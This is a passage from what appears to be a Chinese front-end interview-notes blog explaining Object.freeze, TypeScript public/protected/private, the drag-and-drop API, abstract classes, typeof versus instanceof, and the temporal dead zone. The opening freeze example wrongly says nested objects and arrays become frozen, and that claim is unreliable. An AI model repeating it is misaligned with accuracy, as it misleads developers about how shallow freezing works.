javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> deepObject = &#123;<br>  <span class="hljs-attr">prop1</span>: <span class="hljs-string">&#x27;value1&#x27;</span>,<br>  <span class="hljs-attr">nestedObject</span>: &#123;<br>    <span class="hljs-attr">prop2</span>: <span class="hljs-string">&#x27;value2&#x27;</span>,<br>    <span class="hljs-attr">nestedArray</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>  &#125;<br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(deepObject);<br><br><span class="hljs-comment">// 尝试修改深层对象</span><br>deepObject.<span class="hljs-property">prop1</span> = <span class="hljs-string">&#x27;new value&#x27;</span>; <span class="hljs-comment">// 这不会生效，对象已经冻结</span><br>deepObject.<span class="hljs-property">nestedObject</span>.<span class="hljs-property">prop2</span> = <span class="hljs-string">&#x27;new value&#x27;</span>; <span class="hljs-comment">// 这也不会生效，嵌套对象已经冻结</span><br>deepObject.<span class="hljs-property">nestedObject</span>.<span class="hljs-property">nestedArray</span>.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// 这不会生效，嵌套数组已经冻结</span><br></code></pre></td></tr></table></figure><p>关于 “freeze hook”（冻结钩子），JavaScript本身并没有提供直接的机制来修改已经冻结的对象。一旦对象被冻结，就无法再对其属性进行修改。要实现此类功能，您可能需要自行管理对象的变化，例如，可以在对象被冻结之前创建其可变的副本，然后对副本进行修改，而不是直接修改冻结的对象。这样可以确保原始冻结的对象保持不变。</p><h3 id="13、public-protected-private区别"><a href="#13、public-protected-private区别" class="headerlink" title="13、public protected private区别"></a>13、public protected private区别</h3><p><code>public</code>、<code>protected</code> 和 <code>private</code> 是面向对象编程中用于控制类成员（属性和方法）可见性和访问权限的访问修饰符。它们的主要区别在于谁可以访问这些成员：</p><ol><li><strong>public（公共）：</strong> 成员被声明为 <code>public</code> 时，可以被任何代码访问，包括类的内部和外部。这是默认的访问修饰符。</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> &#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">x</span>); <span class="hljs-comment">// 可以访问 x，因为它是公共的</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong>protected（受保护的）：</strong> 成员被声明为 <code>protected</code> 时，只能被类的内部和派生类的内部访问，外部代码无法直接访问。</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">super</span>(x);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">accessParentX</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>); <span class="hljs-comment">// 可以在子类中访问 x，因为它是受保护的</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> parent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parent</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parent.<span class="hljs-property">x</span>); <span class="hljs-comment">// 无法直接访问 x，因为它是受保护的</span><br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-number">10</span>);<br>child.<span class="hljs-title function_">accessParentX</span>(); <span class="hljs-comment">// 可以通过子类方法访问 x</span><br></code></pre></td></tr></table></figure><ol start="3"><li><strong>private（私有的）：</strong> 成员被声明为 <code>private</code> 时，只能被类的内部访问，外部代码和派生类都无法直接访问。</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x: <span class="hljs-built_in">number</span></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">accessX</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>); <span class="hljs-comment">// 可以在类的内部访问 x，因为它是私有的</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(<span class="hljs-number">5</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">x</span>); <span class="hljs-comment">// 无法直接访问 x，因为它是私有的</span><br>obj.<span class="hljs-title function_">accessX</span>(); <span class="hljs-comment">// 可以通过公共方法访问 x</span><br></code></pre></td></tr></table></figure><p>总结：</p><ul><li><code>public</code> 成员可以在任何地方访问。</li><li><code>protected</code> 成员只能在类的内部和派生类的内部访问。</li><li><code>private</code> 成员只能在类的内部访问。</li></ul><p>这些访问修饰符有助于控制类成员的可见性和访问权限，从而增强了代码的封装性和安全性。</p><h3 id="14、drag-api原理"><a href="#14、drag-api原理" class="headerlink" title="14、drag api原理"></a>14、drag api原理</h3><p>拖放（Drag and Drop，简称DnD）API 是一组Web API，用于实现在Web应用程序中处理拖放操作的功能。它允许用户拖动页面上的元素（如文本、图像或文件）并将其放置到其他地方，这在创建交互性强的Web应用程序时非常有用。拖放API的原理如下：</p><ol><li><p><strong>事件处理：</strong> 拖放操作的核心是事件处理。在拖动元素时，会触发一系列与拖放相关的事件。常见的拖放事件包括：</p><ul><li><code>dragstart</code>：拖动操作开始时触发，通常在拖动源（源元素）上触发。</li><li><code>dragenter</code>：当拖动元素进入可放置目标时触发。</li><li><code>dragover</code>：当拖动元素在可放置目标上移动时触发。</li><li><code>dragleave</code>：当拖动元素离开可放置目标时触发。</li><li><code>drop</code>：当拖动元素放置到可放置目标上时触发。</li></ul></li><li><p><strong>数据传递：</strong> 拖放API允许在拖动操作中传递数据。通常，您可以将自定义数据（例如文本、URL或自定义对象）与拖动元素相关联，然后在 <code>dragstart</code> 事件中将这些数据存储在 <code>DataTransfer</code> 对象中。</p></li><li><p><strong>拖动效果：</strong> 在拖动操作期间，拖动源元素通常会显示某种拖动效果，如半透明的元素或拖动时的复制图标。这可以通过CSS和拖放API的 <code>effectAllowed</code> 和 <code>dropEffect</code> 属性来控制。</p></li><li><p><strong>放置操作：</strong> 当拖动元素放置到可放置目标上时，会触发 <code>drop</code> 事件。在 <code>drop</code> 事件处理程序中，您可以获取拖动操作中传递的数据，并执行相应的操作，如数据处理、元素移动等。</p></li><li><p><strong>取消默认行为：</strong> 默认情况下，浏览器会禁止将拖动的元素放置到不允许的目标上。您可以通过取消 <code>dragover</code> 和 <code>drop</code> 事件的默认行为来允许或禁止放置操作。</p></li><li><p><strong>拖动源和可放置目标的设置：</strong> 拖动操作的成功实现通常需要设置哪些元素可以拖动（拖动源）以及哪些元素可以接受被拖动的元素（可放置目标）。这通常涉及到设置元素的 <code>draggable</code> 和 <code>ondragover</code> 属性。</p></li></ol><p>总的来说，拖放API的原理涉及了事件处理、数据传递、拖动效果、放置操作和取消默认行为等方面。通过合理使用这些功能，开发者可以实现强大的拖放交互，提高Web应用程序的用户体验。</p><h3 id="15、ts中的抽象类和抽象方法"><a href="#15、ts中的抽象类和抽象方法" class="headerlink" title="15、ts中的抽象类和抽象方法"></a>15、ts中的抽象类和抽象方法</h3><p>在 TypeScript 中，您可以使用抽象类和抽象方法来定义抽象的类和方法，这些抽象类和方法需要在子类中实现。抽象类是一个不能被实例化的类，而抽象方法是一个在抽象类中定义但没有具体实现的方法。以下是关于如何在 TypeScript 中使用抽象类和抽象方法的示例和解释：</p><p><strong>定义抽象类：</strong> 抽象类用于定义一组相关的类的通用结构，但不能直接创建它的实例。要定义一个抽象类，您需要在类声明前面加上 <code>abstract</code> 关键字：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span>;<br>  <span class="hljs-title function_">move</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Moving...&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的示例中，<code>Animal</code> 是一个抽象类，它包含一个抽象方法 <code>makeSound</code> 和一个具体方法 <code>move</code>。</p><p><strong>定义抽象方法：</strong> 抽象方法是在抽象类中声明但没有提供实际实现的方法。抽象方法使用 <code>abstract</code> 关键字标记，并且没有方法体：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-keyword">abstract</span> <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>子类必须实现抽象方法，否则它们也必须被声明为抽象类。</p><p><strong>继承抽象类：</strong> 子类可以继承抽象类，并且必须实现抽象方法。例如，如果我们有一个 <code>Dog</code> 类继承自 <code>Animal</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> &#123;<br>  <span class="hljs-title function_">makeSound</span>(): <span class="hljs-built_in">void</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Woof! Woof!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的示例中，<code>Dog</code> 类继承了 <code>Animal</code> 类并实现了抽象方法 <code>makeSound</code>。</p><p><strong>创建实例：</strong> 您可以创建子类的实例，但不能创建抽象类的实例。例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> myDog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>myDog.<span class="hljs-title function_">makeSound</span>(); <span class="hljs-comment">// 输出: Woof! Woof!</span><br>myDog.<span class="hljs-title function_">move</span>();      <span class="hljs-comment">// 输出: Moving...</span><br></code></pre></td></tr></table></figure><p>注意，抽象类的抽象方法必须在子类中被实现，否则 TypeScript 编译器会产生错误。抽象类和抽象方法是用于定义类的结构和规范，以确保派生类满足指定的接口和行为。这在大型应用程序中非常有用，因为它可以帮助您确保代码的一致性和可维护性。</p><h3 id="16、typeof和instancesof"><a href="#16、typeof和instancesof" class="headerlink" title="16、typeof和instancesof"></a>16、typeof和instancesof</h3><h5 id="介绍一下typeof用法"><a href="#介绍一下typeof用法" class="headerlink" title="介绍一下typeof用法"></a>介绍一下typeof用法</h5><p><code>typeof</code> 是JavaScript中的一个操作符，用于获取一个值的数据类型。它通常以如下的方式使用：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> value<br></code></pre></td></tr></table></figure><p>其中，<code>value</code> 是你想要获取其数据类型的值。<code>typeof</code> 操作符返回一个字符串，表示值的数据类型，可能的结果包括以下几种：</p><ol><li><code>&quot;undefined&quot;</code>：表示值是未定义的。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// &quot;undefined&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><code>&quot;boolean&quot;</code>：表示值是布尔类型。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// &quot;boolean&quot;</span><br></code></pre></td></tr></table></figure><ol start="3"><li><code>&quot;number&quot;</code>：表示值是数值类型，包括整数和浮点数。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-number">42</span>; <span class="hljs-comment">// &quot;number&quot;</span><br></code></pre></td></tr></table></figure><ol start="4"><li><code>&quot;string&quot;</code>：表示值是字符串类型。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;Hello&quot;</span>; <span class="hljs-comment">// &quot;string&quot;</span><br></code></pre></td></tr></table></figure><ol start="5"><li><code>&quot;object&quot;</code>：表示值是对象，包括对象、数组、函数等。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> &#123;&#125;; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> []; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// &quot;function&quot;</span><br></code></pre></td></tr></table></figure><ol start="6"><li><code>&quot;symbol&quot;</code>：表示值是符号类型（ES6新增）。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&quot;mySymbol&quot;</span>); <span class="hljs-comment">// &quot;symbol&quot;</span><br></code></pre></td></tr></table></figure><ol start="7"><li><code>&quot;bigint&quot;</code>：表示值是大整数类型（ES11新增）。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-number">1234567890123456789012345678901234567890n</span>; <span class="hljs-comment">// &quot;bigint&quot;</span><br></code></pre></td></tr></table></figure><ol start="8"><li><code>&quot;function&quot;</code>：表示值是函数类型。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>; <span class="hljs-comment">// &quot;function&quot;</span><br></code></pre></td></tr></table></figure><p>需要注意的是，<code>typeof</code> 对于大多数值都能够返回正确的数据类型，但它存在一些特殊情况和限制，例如：</p><ul><li>对于<code>null</code>，<code>typeof</code> 会返回 <code>&quot;object&quot;</code>，这是一个历史遗留问题。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// &quot;object&quot;</span><br></code></pre></td></tr></table></figure><ul><li>对于引用类型（如数组和对象），<code>typeof</code> 会返回 <code>&quot;object&quot;</code>，但它不能进一步区分不同的引用类型。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> []; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> &#123;&#125;; <span class="hljs-comment">// &quot;object&quot;</span><br></code></pre></td></tr></table></figure><p>因此，要更精确地判断值的数据类型，可以考虑使用其他方法，如<code>instanceof</code> 运算符或检查对象的构造函数属性。</p><h5 id="instanceof-原理"><a href="#instanceof-原理" class="headerlink" title="instanceof 原理"></a>instanceof 原理</h5><p><code>instanceof</code> 是 JavaScript 中的一个运算符，用于检查对象是否是某个构造函数的实例。其原理可以简单概括如下：</p><ol><li><p><code>instanceof</code> 运算符首先检查对象的原型链（<code>__proto__</code>）上是否存在构造函数的 <code>prototype</code> 属性。原型链是一条由对象链接而成的链，每个对象都有一个 <code>__proto__</code> 属性指向其原型对象。</p></li><li><p>如果在原型链中找到了构造函数的 <code>prototype</code> 属性，且它与对象的原型链上的某个对象相匹配，那么 <code>instanceof</code> 返回 <code>true</code>，表示对象是该构造函数的实例。</p></li><li><p>如果在原型链上未找到匹配的 <code>prototype</code> 属性，<code>instanceof</code> 返回 <code>false</code>，表示对象不是该构造函数的实例。</p></li></ol><p>下面是一个示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>) &#123;&#125;<br><br><span class="hljs-keyword">var</span> personObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(personObj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// 输出 true</span><br></code></pre></td></tr></table></figure><p>在这个示例中，<code>personObj</code> 是通过 <code>new Person()</code> 创建的一个对象。<code>instanceof</code> 运算符检查 <code>personObj</code> 的原型链，发现 <code>Person.prototype</code> 存在于原型链上，因此返回 <code>true</code>。</p><p>需要注意的是，<code>instanceof</code> 运算符检查的是原型链，所以如果对象的原型链中有多层继承关系，且其中某一层原型链上存在构造函数的 <code>prototype</code> 属性，也会返回 <code>true</code>。但如果构造函数的 <code>prototype</code> 属性被改变，或者对象的原型链被修改，<code>instanceof</code> 的结果可能不符合预期。因此，在实际开发中，建议谨慎使用 <code>instanceof</code>，并且结合其他方式来进行类型检查，例如 <code>Object.prototype.toString.call(obj)</code>。</p><h5 id="typeof和instanceof的区别"><a href="#typeof和instanceof的区别" class="headerlink" title="typeof和instanceof的区别"></a>typeof和instanceof的区别</h5><p><code>typeof</code> 和 <code>instanceof</code> 是 JavaScript 中两个不同的操作符，用于检查变量的类型或对象的原型链关系。它们之间的区别如下：</p><ol><li><p><strong>typeof：</strong></p><ul><li><code>typeof</code> 是一个操作符，用于检查变量的数据类型。</li><li>它返回一个表示数据类型的字符串，例如：”string”、”number”、”boolean”、”undefined”、”object”、”function” 等。</li><li><code>typeof</code> 对于原始数据类型（如字符串、数字、布尔值、undefined）以及函数都能够较好地工作。但对于复杂对象（如数组、日期、正则表达式等），它返回的都是 “object”。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">typeof</span> <span class="hljs-string">&quot;Hello&quot;</span>; <span class="hljs-comment">// &quot;string&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-number">42</span>; <span class="hljs-comment">// &quot;number&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// &quot;boolean&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// &quot;undefined&quot;</span><br><span class="hljs-keyword">typeof</span> &#123;&#125;; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> []; <span class="hljs-comment">// &quot;object&quot;</span><br><span class="hljs-keyword">typeof</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;; <span class="hljs-comment">// &quot;function&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>instanceof：</strong></p><ul><li><code>instanceof</code> 是一个操作符，用于检查对象是否是特定类的实例（或其原型链上的实例）。</li><li>它返回一个布尔值，如果对象是指定类的实例，则返回 <code>true</code>，否则返回 <code>false</code>。</li><li><code>instanceof</code> 主要用于检查对象是否属于自定义类或构造函数的实例，通常用于检查继承关系。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> arr = [];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-keyword">const</span> today = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(today <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>); <span class="hljs-comment">// true</span><br><br><span class="hljs-keyword">const</span> regex = <span class="hljs-regexp">/abc/</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regex <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure></li></ol><p>总结：</p><ul><li><code>typeof</code> 主要用于检查数据类型，对于原始数据类型和函数较为有效，但对于复杂对象类型的区分不够明确。</li><li><code>instanceof</code> 主要用于检查对象的原型链关系，用于检查对象是否是某个类的实例，更适用于自定义类或构造函数的检查。</li></ul><h3 id="x3D-x3D-17、const-var问题-暂时性死区-x3D-x3D"><a href="#x3D-x3D-17、const-var问题-暂时性死区-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;17、const var问题 暂时性死区&#x3D;&#x3D;"></a>&#x3D;&#x3D;17、const var问题 暂时性死区&#x3D;&#x3D;</h3><p>“暂时性死区”（Temporal Dead Zone，简称 TDZ）是指在 JavaScript 中，在某些情况下，变量在声明之前是不可访问的，并且会导致在访问这些变量时抛出 ReferenceError 错误（Cannot access ‘a’ before initialization）。这个现象通常出现在使用 <code>let</code> 和 <code>const</code> 声明变量时，而不是 <code>var</code>。</p><p>具体来说，暂时性死区发生在以下情况下：</p><ol><li><p><strong>变量在块级作用域内被声明：</strong> 当一个变量在块级作用域（如 <code>&#123;&#125;</code> 内）中使用 <code>let</code> 或 <code>const</code> 声明时，它只能在声明之后的代码中访问。在声明之前访问这个变量会导致暂时性死区。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// ReferenceError: Cannot access &#x27;x&#x27; before initialization</span><br>  <span class="hljs-keyword">let</span> x = <span class="hljs-number">10</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>变量在函数内部被声明：</strong> 同样地，如果一个变量在函数内部使用 <code>let</code> 或 <code>const</code> 声明，它也只能在声明之后的代码中访问。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// ReferenceError: Cannot access &#x27;y&#x27; before initialization</span><br>  <span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>变量在全局作用域内被声明：</strong> 即使变量在全局作用域中声明，如果使用 <code>let</code> 或 <code>const</code>，也会存在暂时性死区。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(z); <span class="hljs-comment">// ReferenceError: Cannot access &#x27;z&#x27; before initialization</span><br><span class="hljs-keyword">let</span> z = <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure></li></ol><p>要避免暂时性死区错误，可以在使用变量之前先进行声明和初始化，或者使用 <code>var</code> 关键字，因为 <code>var</code> 声明的变量没有暂时性死区。</p><p>暂时性死区的出现是为了增强 JavaScript 中变量的可预测性和安全性，防止意外的行为发生，但也需要开发人员了解和谨慎使用 <code>let</code> 和 <code>const</code>。</p><h5 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h5><p>在 JavaScript 中，<code>let</code>、<code>const</code> 和 <code>var</code> 是用于声明变量的关键字，它们具有不同的作用域规则：</p><ol><li><strong><code>var</code> 的作用域：</strong><ul><li><code>var</code> 声明的变量具有函数作用域（function scope）。这意味着它们在声明它们的函数内可见，但在函数外不可见。</li><li>如果 <code>var</code> 在函数内部声明，它对整个函数内部都是可见的。</li><li>如果 <code>var</code> 在全局范围内声明，它对整个页面或脚本都是可见的。</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">var</span> y = <span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 10</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 20</span><br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span 